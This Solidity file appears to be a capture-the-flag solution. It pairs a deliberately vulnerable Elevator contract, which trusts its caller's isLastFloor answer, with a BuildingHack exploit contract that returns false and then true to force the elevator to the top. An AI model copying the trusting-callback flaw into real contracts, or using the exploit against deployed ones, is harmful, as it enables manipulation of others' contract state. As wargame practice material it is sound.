pragma solidity ^0.4.18;

//interface allows different contracts to communicate with each other
interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract BuildingHack {
    Elevator public el = Elevator(0xd32876675c10d3181cdf6a29778767ce28910440);//instance address 
    bool public switchFlipped =  false; 
    
    function hack() public {
        el.goTo(1);
    }
    
    function isLastFloor(uint) view public returns (bool) {
        // first 
      if (! switchFlipped) {
        switchFlipped = true;
        return false;
        // second 
      } else {
        switchFlipped = false;
        return true;
      }
    }
}
